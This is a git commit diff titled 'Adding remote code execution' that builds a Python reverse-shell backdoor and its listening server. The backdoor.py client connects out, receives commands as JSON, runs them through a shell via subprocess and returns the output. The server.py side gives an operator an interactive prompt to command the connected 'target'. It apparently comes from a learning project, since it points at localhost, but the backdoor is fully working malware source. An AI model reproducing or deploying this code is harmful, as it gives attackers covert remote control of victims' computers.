d8e05e50cefa3b11410a6b3c205ed61ee29b33ca
atz <joaocougia@gmail.com>
2021-02-24 13:54:33 -0300

    Adding remote code execution

--- backdoor.py
+++ backdoor.py
@@ -1,6 +1,35 @@
 import socket
+import json
+import subprocess
+
+
+
+
+def reliable_rcv():
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
+def shell():    
+    while True:
+        command = reliable_rcv()
+        if command == "quit":
+            break
+        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        result = execute.stdout.read() + execute.stderr.read()
+        result = result.decode()
+        reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('127.0.0.1', 777))
-msg = "backdoor"
-s.send(msg.encode())
+
+shell()
--- server.py
+++ server.py
@@ -1,10 +1,21 @@
 import socket
 import termcolor
+import json
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    target.send(jsondata.encode())
 
 
-def target_communication():
-    message = target.recv(1024)
-    print(message.decode())
+def reliable_rcv():
+    data = ''
+    while True:
+        try:
+            data = data + target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('127.0.0.1', 777))
@@ -14,4 +25,13 @@ sock.listen(5)
 
 target, ip = sock.accept()
 print(termcolor.colored(f"(!) TARGET CONNECTED FROM {ip} (!)", 'green'))
+def target_communication():
+    while True:
+        command = input(f"(machine: {ip} >")
+        reliable_send(command)
+        if command == "quit":
+            break
+        result = reliable_rcv()
+        print(result)
+    
 target_communication()
